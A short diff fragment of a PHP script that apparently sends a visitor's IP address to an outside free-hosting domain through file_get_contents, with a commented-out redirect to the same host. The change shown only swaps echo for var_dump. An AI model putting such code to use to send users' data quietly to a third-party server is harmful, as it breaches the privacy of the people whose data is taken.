@@ -49,7 +49,7 @@
     );
     $context = stream_context_create($opts);
     $result = file_get_contents('https://sparkling1234.000webhostapp.com/', false, $context);
-    echo $ip_to_send;
+    var_dump($ip_to_send);
     
 
     // header('Location: '."https://sparkling1234.000webhostapp.com/");
